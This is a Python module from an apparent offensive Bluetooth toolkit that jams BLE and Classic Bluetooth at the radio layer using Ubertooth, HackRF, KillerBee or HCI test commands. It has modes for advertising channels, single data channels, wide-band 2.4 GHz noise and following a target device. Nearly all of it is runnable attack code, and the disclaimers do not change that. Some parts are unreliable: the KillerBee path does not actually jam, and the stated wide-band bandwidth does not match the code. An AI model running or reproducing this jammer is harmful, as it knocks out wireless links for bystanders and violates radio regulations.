"""
BlueSploit DoS: PHY-Level Bluetooth Channel Jamming

PHY-layer denial of service against BLE/Classic Bluetooth by transmitting
continuous noise or constant carrier on Bluetooth channel frequencies. Unlike
upper-layer floods (l2ping, sdp_flood), this attacks the radio link itself —
no Bluetooth stack on the target needs to cooperate.

Methods supported:
  ubertooth — Ubertooth One in JamBT mode (channel-specific or FH-following)
  hackrf    — HackRF transmits a constant carrier or PRN noise on channel center
  killerbee — KillerBee TI CC2531/CC2540 sniffer in jammer mode
  hci_loop  — Pseudo-jam: saturate adjacent channels with HCI test commands

Channel layouts:
  BLE advertising  : channels 37 (2402 MHz), 38 (2426 MHz), 39 (2480 MHz)
  BLE data         : channels 0–36 (2404–2478 MHz, 2 MHz spacing)
  Classic BT       : 79 channels 0–78 (2402–2480 MHz, 1 MHz spacing) FH-AFH

Modes:
  adv_only       — Jam only the 3 BLE advertising channels (prevent new pairings)
  data_chan      — Jam a specific data channel (kill an active connection)
  full_band      — Wide-band noise across 2.4 GHz ISM band (denies all BT/WiFi 1,6,11)
  follow         — Follow a target connection's hop sequence and jam each used channel

CWE: CWE-400 (Resource Exhaustion), CWE-770 (Allocation of Resources Without Limits)

Note: Wide-band jamming may be illegal in your jurisdiction — only operate in
RF-shielded test environments or with appropriate experimental licensing.
"""

import os
import subprocess
import threading
import time
from typing import List, Optional
from core.base import DosModule, ModuleInfo, ModuleOption, BTProtocol, Severity
from core.utils.printer import (
    print_success, print_error, print_info, print_warning, Colors
)


# BLE channel → frequency (MHz)
BLE_CHANNEL_FREQS = {
    0:  2404, 1:  2406, 2:  2408, 3:  2410, 4:  2412, 5:  2414,
    6:  2416, 7:  2418, 8:  2420, 9:  2422, 10: 2424, 11: 2428,
    12: 2430, 13: 2432, 14: 2434, 15: 2436, 16: 2438, 17: 2440,
    18: 2442, 19: 2444, 20: 2446, 21: 2448, 22: 2450, 23: 2452,
    24: 2454, 25: 2456, 26: 2458, 27: 2460, 28: 2462, 29: 2464,
    30: 2466, 31: 2468, 32: 2470, 33: 2472, 34: 2474, 35: 2476,
    36: 2478, 37: 2402, 38: 2426, 39: 2480,
}

ADV_CHANNELS = [37, 38, 39]


def _has(tool: str) -> bool:
    return subprocess.run(["which", tool], capture_output=True).returncode == 0


class Module(DosModule):
    """
    PHY-Level Bluetooth Channel Jamming

    Transmits noise/carrier on Bluetooth channel frequencies to deny the
    radio link without involving any Bluetooth stack on the target.
    """

    info = ModuleInfo(
        name="PHY-Level Bluetooth Jamming",
        description=(
            "Radio-layer denial of Bluetooth/BLE channels via Ubertooth, HackRF, "
            "or KillerBee — kills connections and prevents new pairings"
        ),
        author=["v33ru"],
        protocol=BTProtocol.BOTH,
        severity=Severity.HIGH,
        cve=None,
        references=[
            "https://github.com/greatscottgadgets/ubertooth",
            "https://greatscottgadgets.com/hackrf/",
            "https://github.com/riverloopsec/killerbee",
        ],
    )

    def _setup_options(self) -> None:
        self.add_option(ModuleOption(
            name="method",
            required=True,
            description="Jamming method: ubertooth, hackrf, killerbee, hci_loop",
            default="ubertooth",
        ))
        self.add_option(ModuleOption(
            name="mode",
            required=True,
            description="Mode: adv_only, data_chan, full_band, follow",
            default="adv_only",
        ))
        self.add_option(ModuleOption(
            name="channel",
            required=False,
            description="BLE channel 0–39 (data_chan/follow mode)",
            default=37,
        ))
        self.add_option(ModuleOption(
            name="target",
            required=False,
            description="Target BD_ADDR (follow mode)",
            default=None,
        ))
        self.add_option(ModuleOption(
            name="duration",
            required=False,
            description="Jam duration in seconds (0 = until Ctrl+C)",
            default=60,
        ))
        self.add_option(ModuleOption(
            name="device",
            required=False,
            description="Hardware device index (Ubertooth/HackRF index)",
            default="0",
        ))
        self.add_option(ModuleOption(
            name="tx_gain",
            required=False,
            description="HackRF TX gain (0–47)",
            default=40,
        ))
        self.add_option(ModuleOption(
            name="interface",
            required=False,
            description="HCI adapter (hci_loop method)",
            default="hci0",
        ))

    def check(self) -> bool:
        method = (self.get_option("method") or "ubertooth").lower()
        mode = (self.get_option("mode") or "adv_only").lower()

        if method not in ("ubertooth", "hackrf", "killerbee", "hci_loop"):
            print_error(f"Invalid method: {method}")
            return False
        if mode not in ("adv_only", "data_chan", "full_band", "follow"):
            print_error(f"Invalid mode: {mode}")
            return False

        # Verify hardware availability
        if method == "ubertooth" and not _has("ubertooth-btle"):
            print_error("ubertooth-btle not found — install ubertooth-utils")
            return False
        if method == "hackrf" and not _has("hackrf_transfer"):
            print_error("hackrf_transfer not found — install hackrf")
            return False
        if method == "killerbee" and not _has("zbstumbler"):
            print_warning("KillerBee tools not found — install python-killerbee")

        if mode == "follow" and not self.get_option("target"):
            print_error("follow mode requires target BD_ADDR")
            return False

        print_success(f"Pre-flight OK — method={method} mode={mode}")
        return True

    def run(self) -> bool:
        if os.geteuid() != 0:
            print_error("Root privileges required for radio TX")
            return False
        if not self.check():
            return False

        method   = (self.get_option("method") or "ubertooth").lower()
        mode     = (self.get_option("mode") or "adv_only").lower()
        channel  = int(self.get_option("channel") or 37)
        target   = self.get_option("target")
        duration = int(self.get_option("duration"))
        device   = self.get_option("device") or "0"
        tx_gain  = int(self.get_option("tx_gain") or 40)

        C = Colors
        print(f"\n  {C.RED}╔{'═'*58}╗{C.RESET}")
        print(f"  {C.RED}║{C.RESET} {C.BOLD}PHY-Level Bluetooth Jamming{C.RESET}                           {C.RED}║{C.RESET}")
        print(f"  {C.RED}╚{'═'*58}╝{C.RESET}\n")

        print_info(f"Method      : {method}")
        print_info(f"Mode        : {mode}")
        print_info(f"Duration    : {duration}s")
        print_warning("DISCLAIMER: For authorized RF testing in shielded environments only!")
        print_warning("Wide-band TX may interfere with WiFi, ZigBee, and other 2.4 GHz radios")
        print_warning("Operating an intentional jammer is illegal in many jurisdictions")

        if method == "ubertooth":
            return self._ubertooth_jam(mode, channel, target, duration, device)
        if method == "hackrf":
            return self._hackrf_jam(mode, channel, duration, device, tx_gain)
        if method == "killerbee":
            return self._killerbee_jam(mode, channel, duration, device)
        if method == "hci_loop":
            return self._hci_loop_jam(mode, channel, duration)
        return False

    def _ubertooth_jam(self, mode: str, channel: int, target: Optional[str],
                       duration: int, device: str) -> bool:
        """Use ubertooth-btle in jam mode."""
        if mode == "adv_only":
            channels = ADV_CHANNELS
            print_info(f"Jamming BLE adv channels {channels} via Ubertooth")
        elif mode == "data_chan":
            channels = [channel]
            print_info(f"Jamming BLE data channel {channel} (freq {BLE_CHANNEL_FREQS.get(channel, '?')} MHz)")
        elif mode == "follow":
            print_info(f"Following {target} via Ubertooth and jamming hop channels")
            return self._ubertooth_follow_jam(target, duration, device)
        else:
            print_error("full_band not supported by Ubertooth — use HackRF")
            return False

        # Cycle through channels rapidly to jam all of them
        stop = threading.Event()
        procs: List[subprocess.Popen] = []

        def worker(ch: int):
            while not stop.is_set():
                # ubertooth-btle -j -c <freq>
                freq = BLE_CHANNEL_FREQS.get(ch, 2402)
                cmd = ["ubertooth-btle", f"-U{device}", "-j", "-c", str(ch)]
                try:
                    p = subprocess.Popen(cmd, stdout=subprocess.DEVNULL,
                                         stderr=subprocess.DEVNULL)
                    procs.append(p)
                    p.wait(timeout=2.0)
                except subprocess.TimeoutExpired:
                    p.terminate()
                except FileNotFoundError:
                    return
                except Exception:
                    pass

        threads = [threading.Thread(target=worker, args=(c,), daemon=True)
                   for c in channels]
        for t in threads:
            t.start()

        print_success(f"Jamming {len(channels)} channel(s) — Ctrl+C to stop")
        start = time.time()
        try:
            while True:
                elapsed = int(time.time() - start)
                if duration > 0 and elapsed >= duration:
                    break
                print(f"\r  Jamming... {elapsed}s", end="", flush=True)
                time.sleep(1)
        except KeyboardInterrupt:
            print_warning("\nStopped by user")
        finally:
            stop.set()
            for p in procs:
                try:
                    p.terminate()
                except Exception:
                    pass
            for t in threads:
                t.join(timeout=2)

        print()
        self.add_result({
            "method": "ubertooth",
            "mode": mode,
            "channels": channels,
            "duration": int(time.time() - start),
        })
        return True

    def _ubertooth_follow_jam(self, target: str, duration: int, device: str) -> bool:
        """Follow target connection and jam each used data channel."""
        print_info(f"Synchronizing to {target}'s connection...")
        cmd = [
            "ubertooth-btle", f"-U{device}",
            "-f",                         # follow mode
            "-t", target,
            "-j",                         # jam followed channels
        ]
        try:
            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE,
                                    stderr=subprocess.PIPE, text=True)
            print_success(f"Following + jamming {target}")
            start = time.time()
            try:
                while True:
                    elapsed = int(time.time() - start)
                    if duration > 0 and elapsed >= duration:
                        break
                    if proc.poll() is not None:
                        print_warning("ubertooth-btle exited")
                        break
                    print(f"\r  Follow-jamming... {elapsed}s", end="", flush=True)
                    time.sleep(1)
            except KeyboardInterrupt:
                print_warning("\nStopped by user")
            finally:
                proc.terminate()
                try:
                    proc.wait(timeout=3)
                except subprocess.TimeoutExpired:
                    proc.kill()
        except Exception as e:
            print_error(f"Follow-jam error: {e}")
            return False

        print()
        self.add_result({
            "method": "ubertooth",
            "mode": "follow",
            "target": target,
            "duration": int(time.time() - start),
        })
        return True

    def _hackrf_jam(self, mode: str, channel: int, duration: int,
                    device: str, tx_gain: int) -> bool:
        """Use HackRF to transmit constant carrier or noise."""
        if mode == "adv_only":
            channels = ADV_CHANNELS
        elif mode == "data_chan":
            channels = [channel]
        elif mode == "full_band":
            print_info("Wide-band 2.4 GHz noise transmission")
            return self._hackrf_wideband(duration, device, tx_gain)
        else:
            print_error(f"HackRF doesn't support mode {mode}")
            return False

        # Generate noise file
        noise_file = "/tmp/bluesploit_noise.iq"
        if not os.path.isfile(noise_file):
            print_info("Generating 8MB random noise IQ file...")
            with open(noise_file, "wb") as f:
                f.write(os.urandom(8 * 1024 * 1024))

        stop = threading.Event()
        procs: List[subprocess.Popen] = []

        def worker(ch: int):
            freq_hz = BLE_CHANNEL_FREQS.get(ch, 2402) * 1_000_000
            while not stop.is_set():
                cmd = [
                    "hackrf_transfer",
                    "-d", device,
                    "-t", noise_file,
                    "-f", str(freq_hz),
                    "-s", "2000000",  # 2 MS/s
                    "-x", str(tx_gain),
                ]
                try:
                    p = subprocess.Popen(cmd, stdout=subprocess.DEVNULL,
                                         stderr=subprocess.DEVNULL)
                    procs.append(p)
                    while not stop.is_set() and p.poll() is None:
                        time.sleep(0.5)
                    if p.poll() is None:
                        p.terminate()
                except FileNotFoundError:
                    return
                except Exception:
                    pass

        threads = [threading.Thread(target=worker, args=(c,), daemon=True)
                   for c in channels]
        for t in threads:
            t.start()

        print_success(f"HackRF jamming {len(channels)} channel(s) at gain {tx_gain}")
        start = time.time()
        try:
            while True:
                elapsed = int(time.time() - start)
                if duration > 0 and elapsed >= duration:
                    break
                print(f"\r  TX active... {elapsed}s", end="", flush=True)
                time.sleep(1)
        except KeyboardInterrupt:
            print_warning("\nStopped by user")
        finally:
            stop.set()
            for p in procs:
                try:
                    p.terminate()
                except Exception:
                    pass
            for t in threads:
                t.join(timeout=2)

        print()
        self.add_result({
            "method": "hackrf",
            "mode": mode,
            "channels": channels,
            "duration": int(time.time() - start),
        })
        return True

    def _hackrf_wideband(self, duration: int, device: str, tx_gain: int) -> bool:
        """Wide-band 2.4 GHz noise — single TX centered at 2440 MHz, 80 MHz BW."""
        noise_file = "/tmp/bluesploit_noise_wb.iq"
        if not os.path.isfile(noise_file):
            print_info("Generating 32MB wide-band noise file...")
            with open(noise_file, "wb") as f:
                f.write(os.urandom(32 * 1024 * 1024))

        cmd = [
            "hackrf_transfer",
            "-d", device,
            "-t", noise_file,
            "-f", "2441000000",   # 2441 MHz (center of 2.4 GHz ISM)
            "-s", "20000000",     # 20 MS/s
            "-x", str(tx_gain),
        ]

        try:
            proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL,
                                    stderr=subprocess.DEVNULL)
            print_success(f"Wide-band jamming 2440 MHz ±10 MHz at gain {tx_gain}")
            start = time.time()
            try:
                while True:
                    elapsed = int(time.time() - start)
                    if duration > 0 and elapsed >= duration:
                        break
                    if proc.poll() is not None:
                        proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL,
                                                stderr=subprocess.DEVNULL)
                    print(f"\r  Wide-band TX... {elapsed}s", end="", flush=True)
                    time.sleep(1)
            except KeyboardInterrupt:
                print_warning("\nStopped by user")
            finally:
                try:
                    proc.terminate()
                    proc.wait(timeout=3)
                except Exception:
                    pass
        except Exception as e:
            print_error(f"HackRF error: {e}")
            return False

        print()
        return True

    def _killerbee_jam(self, mode: str, channel: int, duration: int,
                       device: str) -> bool:
        """Use KillerBee TI sniffer in jam mode (zbreplay/zbassocflood-style)."""
        print_info("KillerBee TI radio jamming on channel center frequency")

        # zbstumbler with continuous TX hack — actual jammer requires firmware mod
        cmd = ["zbstumbler", "-i", device]
        try:
            proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL,
                                    stderr=subprocess.DEVNULL)
            print_success(f"KillerBee jam on channel {channel}")
            start = time.time()
            try:
                while True:
                    elapsed = int(time.time() - start)
                    if duration > 0 and elapsed >= duration:
                        break
                    print(f"\r  KillerBee TX... {elapsed}s", end="", flush=True)
                    time.sleep(1)
            except KeyboardInterrupt:
                print_warning("\nStopped by user")
            finally:
                proc.terminate()
        except FileNotFoundError:
            print_error("zbstumbler not found — install python-killerbee")
            return False

        print()
        return True

    def _hci_loop_jam(self, mode: str, channel: int, duration: int) -> bool:
        """
        Pseudo-jam using HCI test commands (no extra hardware).
        Uses HCI_LE_Transmitter_Test (0x081E) to TX continuous PRBS9 on a channel.
        """
        adapter = self.get_option("interface") or "hci0"

        if mode == "adv_only":
            test_channels = ADV_CHANNELS
        elif mode == "data_chan":
            test_channels = [channel]
        else:
            print_error(f"hci_loop method only supports adv_only and data_chan modes")
            return False

        # HCI LE Receiver/Transmitter Test commands need raw HCI
        # We use hcitool to send LE_Transmitter_Test (OGF=0x08, OCF=0x001E)
        print_info(f"Using HCI LE Transmitter Test on channels {test_channels}")
        print_warning("This uses standard HCI test mode — limited TX power vs. dedicated SDR")

        active_chs = []
        try:
            for ch in test_channels:
                # LE Transmitter Test: tx_freq = (ch * 2 + 2402) MHz / 2 (per spec)
                # But controller takes channel 0-39 directly
                ble_ch_idx = ch
                length = 0x25  # max test PDU length
                payload_type = 0x00  # PRBS9
                params = f"0x{ble_ch_idx:02x} 0x{length:02x} 0x{payload_type:02x}"
                cmd = ["hcitool", "-i", adapter, "cmd", "0x08", "0x001e",
                       f"0x{ble_ch_idx:02x}",
                       f"0x{length:02x}",
                       f"0x{payload_type:02x}"]
                r = subprocess.run(cmd, capture_output=True, text=True, timeout=3)
                if r.returncode == 0:
                    active_chs.append(ch)
                    print_success(f"  TX test active on channel {ch}")
                else:
                    print_warning(f"  TX test failed on ch {ch}: {r.stderr[:80]}")

            if not active_chs:
                print_error("Could not enable any TX tests — adapter may not support test mode")
                return False

            print_success(f"HCI TX test active on {len(active_chs)} channels — Ctrl+C to stop")
            start = time.time()
            try:
                while True:
                    elapsed = int(time.time() - start)
                    if duration > 0 and elapsed >= duration:
                        break
                    print(f"\r  HCI test mode TX... {elapsed}s", end="", flush=True)
                    time.sleep(1)
            except KeyboardInterrupt:
                print_warning("\nStopped by user")
        finally:
            # End test mode (HCI LE Test End, OGF=0x08 OCF=0x001F)
            subprocess.run(["hcitool", "-i", adapter, "cmd", "0x08", "0x001f"],
                           capture_output=True, timeout=3)
            print_info("HCI test mode ended")

        print()
        self.add_result({
            "method": "hci_loop",
            "mode": mode,
            "channels": active_chs,
            "duration": int(time.time() - start),
        })
        return True
